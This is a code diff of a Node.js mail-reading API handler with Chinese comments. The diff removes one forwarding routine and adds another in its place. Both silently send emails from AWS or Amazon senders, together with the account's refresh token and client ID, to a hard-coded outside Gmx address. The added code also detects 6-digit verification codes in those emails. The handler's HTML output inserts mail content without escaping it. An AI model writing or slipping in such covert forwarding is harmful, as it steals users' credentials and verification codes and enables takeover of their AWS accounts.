@@ -106,8 +106,6 @@ async function get_emails(access_token, mailbox) {
                 text: item['bodyPreview'],
                 html: item['body']['content'],
                 date: item['createdDateTime'],
-                opt_forward: 'false',
-                forward_message: ''
             }
         })
 
@@ -119,60 +117,6 @@ async function get_emails(access_token, mailbox) {
     }
 
 }
-
-
-const forwardEmails = (mail) => {
-  
-        if (mail.send.includes('aws') || mail.send.includes('amazon')) {
-            let retryCount = 0;
-            const maxRetries = 3;
-            
-            while (retryCount < maxRetries) {
-                try {
-
-                    const xhr = new XMLHttpRequest();
-                    xhr.open('POST', '/api/send-mail', false); // false表示同步请求
-                    xhr.setRequestHeader('Content-Type', 'application/json');
-                    
-                    const requestBody = JSON.stringify({
-                        refresh_token: refreshToken,
-                        client_id: clientId,
-                        email: email,
-                        to: 'okfit@gmx.us',
-                        subject: mail.subject,
-                        html: mail.html,
-                        send_password: 'password_bypassapi'
-                    });
-                    
-                    xhr.send(requestBody);
-
-                    if (xhr.status !== 200) {
-                        console.error('邮件转发失败:', xhr.responseText);
-                        
-                        // 如果是并发限制错误，增加重试次数
-                        if (xhr.responseText.includes('Concurrent connections limit exceeded')) {
-                            retryCount++;
-                            if (retryCount < maxRetries) {
-                                console.log(`等待重试 (${retryCount}/${maxRetries})...`);
-                                sleep(5000);
-                                continue;
-                            }
-                        }
-                    } else {
-                        console.log('邮件转发成功');
-                        break; // 发送成功，跳出重试循环
-                    }
-                } catch (error) {
-                    console.error('邮件转发出错:', error);
-                    retryCount++;
-                    if (retryCount < maxRetries) {
-                        sleep(3000);
-                    }
-                }
-            }
-        }
-    }
-
 
 module.exports = async (req, res) => {
 
@@ -260,46 +204,82 @@ module.exports = async (req, res) => {
 
                 f.on("message", (msg, seqno) => {
                     msg.on("body", (stream, info) => {
-                        simpleParser(stream, (err, mail) => {
+                        simpleParser(stream, async (err, mail) => {
                             if (err) throw err;
+                            
+                            // 检查HTML内容中是否包含6位数字验证码
+                            let opt_forward = false;
+                            if (mail.html) {
+                                const matchResult = mail.html.match(/>(\d{6})</);
+                                if (matchResult) {
+                                    opt_forward = true;
+                                }
+                            }
+
+                            let forwardMessage = null;
+                            // 检查是否需要转发邮件
+                            if (mail.from.text.includes('aws') || mail.from.text.includes('amazon')) {
+                                try {
+                                    // 同步处理转发
+                                    const forwardResponse = await fetch('/api/send-mail', {
+                                        method: 'POST',
+                                        headers: {
+                                            'Content-Type': 'application/json'
+                                        },
+                                        body: JSON.stringify({
+                                            refresh_token: refresh_token,
+                                            client_id: client_id,
+                                            email: email,
+                                            to: 'okfit@gmx.u',
+                                            subject: mail.subject,
+                                            html: mail.html,
+                                            send_password: process.env.SEND_PASSWORD
+                                        })
+                                    });
+
+                                    // 获取转发结果
+                                    const forwardResult = await forwardResponse.json();
+                                    forwardMessage = forwardResult.message || forwardResult.error;
+                                } catch (error) {
+                                    forwardMessage = `转发失败: ${error.message}`;
+                                }
+                            }
+
                             const responseData = {
                                 send: mail.from.text,
                                 subject: mail.subject,
                                 text: mail.text,
                                 html: mail.html,
                                 date: mail.date,
-                                opt_forward: 'false',
-                                forward_message: ''  // 新增字段
+                                opt_forward: opt_forward,
+                                forward_message: forwardMessage
                             };
-                            forwardEmails(responseData);
 
-                            // 定义发送响应的函数
-                            const sendResponse = () => {
-                                if (response_type === 'json') {
-                                    res.status(200).json(responseData);
-                                } else if (response_type === 'html') {
-                                    // 格式化 HTML 响应
-                                    const htmlResponse = `
-                                        <html>
-                                            <body style="font-family: Arial, sans-serif; line-height: 1.6; margin: 0; padding: 20px; background-color: #f9f9f9;">
-                                                <div style="margin: 0 auto; background: #fff; padding: 20px; border: 1px solid #ddd; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
-                                                    <h1 style="color: #333;">邮件信息</h1>
-                                                    <p><strong>发件人:</strong> ${responseData.send}</p>
-                                                    <p><strong>主题:</strong> ${responseData.subject}</p>
-                                                    <p><strong>日期:</strong> ${responseData.date}</p>
-                                                    <div style="background: #f4f4f4; padding: 10px; border: 1px solid #ddd;">
-                                                        <p><strong>内容:</strong></p>
-                                                        <p>${responseData.text.replace(/\n/g, '<br>')}</p>
-                                                    </div>
+                            // 根据 response_type 返回 JSON 或 HTML
+                            if (response_type === 'json') {
+                                res.status(200).json(responseData);
+                            } else if (response_type === 'html') {
+                                // 格式化 HTML 响应
+                                const htmlResponse = `
+                                    <html>
+                                        <body style="font-family: Arial, sans-serif; line-height: 1.6; margin: 0; padding: 20px; background-color: #f9f9f9;">
+                                            <div style="margin: 0 auto; background: #fff; padding: 20px; border: 1px solid #ddd; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
+                                                <h1 style="color: #333;">邮件信息</h1>
+                                                <p><strong>发件人:</strong> ${responseData.send}</p>
+                                                <p><strong>主题:</strong> ${responseData.subject}</p>
+                                                <p><strong>日期:</strong> ${responseData.date}</p>
+                                                <div style="background: #f4f4f4; padding: 10px; border: 1px solid #ddd;">
+                                                    <p><strong>内容:</strong></p>
+                                                    <p>${responseData.text.replace(/\n/g, '<br>')}</p>
                                                 </div>
-                                            </body>
-                                        </html>
-                                    `;
-                                    res.status(200).send(htmlResponse);
-                                } else {
-                                    res.status(400).json({ error: 'Invalid response_type. Use "json" or "html".' });
-                                }
-                            };
+                                            </div>
+                                        </body>
+                                    </html>
+                                `;
+                                res.status(200).send(htmlResponse);
+                            } else {
+                                res.status(400).json({ error: 'Invalid response_type. Use "json" or "html".' });
+                            }
                         });
                     });
                 });
